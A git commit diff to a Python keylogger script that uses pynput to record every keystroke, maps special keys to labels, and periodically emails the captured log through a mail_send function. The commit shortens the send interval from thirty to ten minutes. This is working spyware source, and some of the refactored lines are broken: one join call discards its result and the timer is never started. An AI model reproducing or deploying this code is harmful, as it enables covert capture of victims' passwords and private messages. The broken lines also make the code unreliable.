1358544f10a284a0986f349ae5fb8da27bfee2c9
Deus <119631661+OldKokoroz@users.noreply.github.com>
2024-02-17 00:08:12 +0300

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -11,98 +11,28 @@ mail_head = ""
 
 def listener(key):
     global log
+    key_dict = {key.space: " ", key.enter: " [ENTER] ", key.backspace: " [BACKSPACE] ",
+                key.ctrl_l: " [CTRL] ", key.ctrl_r: " [CTRL] ", key.shift: " [SHIFT] ",
+                key.shift_r: " [SHIFT] ", key.delete: " [DELETE] ", key.esc: " [ESC] ",
+                key.tab: " [TAB] ", key.up: " [UP] ", key.down: " [DOWN] ",
+                key.left: " [LEFT] ", key.right: " [RIGHT] ", key.cmd: " [WINDOWS-KEY] ",
+                key.cmd_r: " [WINDOWS-KEY] ", key.f1: " [F1] ", key.f2: " [F2] ",
+                key.f3: " [F3] ", key.f4: " [F4] ", key.f5: " [F5] ", key.f6: " [F6] ",
+                key.f7: " [F7] ", key.f8: " [F8] ", key.f9: " [F9] ",
+                key.f10: " [F10] ", key.f11: " [F11] ", key.f12: " [F12] ",
+                key.alt_l: " [ALT] ", key.alt_r: " [ALT] ", key.caps_lock: " [CAPSLOCK] ", key.home: " [HOME] "
+                }
 
     try:
         log = "Line :" + log + key.char.encode("UTF-8")
 
     except AttributeError:
-
-        if key == key.space:
-            log += " "
-
-        elif key == key.enter:
-            log += " [ENTER] "
-
-        elif key == key.backspace:
-            log += " [BACKSPACE] "
-
-        elif key == key.ctrl_l or key == key.ctrl_r:
-            log += " [CTRL] "
-
-        elif key == key.shift or key == key.shift_r:
-            log += " [SHIFT] "
-
-        elif key == key.delete:
-            log += " [DELETE] "
-
-        elif key == key.esc:
-            log += " [ESC] "
-
-        elif key == key.tab:
-            log += " [TAB] "
-
-        elif key == key.up:
-            log += " [UP] "
-
-        elif key == key.down:
-            log += " [DOWN] "
-
-        elif key == key.left:
-            log += " [LEFT] "
-
-        elif key == key.right:
-            log += " [RIGHT] "
-
-        elif key == key.cmd or key == key.cmd_r:
-            log += " [WINDOWS-KEY] "
-
-        elif key == key.f1:
-            log += " [F1] "
-
-        elif key == key.f2:
-            log += " [F2] "
-
-        elif key == key.f3:
-            log += " [F3] "
-
-        elif key == key.f4:
-            log += " [F4] "
-
-        elif key == key.f5:
-            log += " [F5] "
-
-        elif key == key.f6:
-            log += " [F6] "
-
-        elif key == key.f7:
-            log += " [F7] "
-
-        elif key == key.f8:
-            log += " [F8] "
-
-        elif key == key.f9:
-            log += " [F9] "
-
-        elif key == key.f10:
-            log += " [F10] "
-
-        elif key == key.f11:
-            log += " [F11] "
-
-        elif key == key.f12:
-            log += " [F12] "
-
-        elif key == key.alt_l or key == key.alt_r:
-            log += " [ALT] "
-
-        elif key == key.caps_lock:
-            log += " [CAPSLOCK] "
-
-        elif key == key.home:
-            log += " [HOME] "
+        if key not in key_dict.keys():
+            log += " " + str(key) + " "
 
         else:
-            log += " " + str(key) + " "
+            # log += str(key_dict.get(key))
+            log.join(key_dict.get(key))
 
 
 def hour_wait():
@@ -140,7 +70,7 @@ Captured : {log}
     mail_send("", "", log_msg)
     log = ""
 
-    threading.Timer(1800, thread_all)
+    threading.Timer(600, thread_all)
 
 
 keylogger = pynput.keyboard.Listener(on_press=listener)
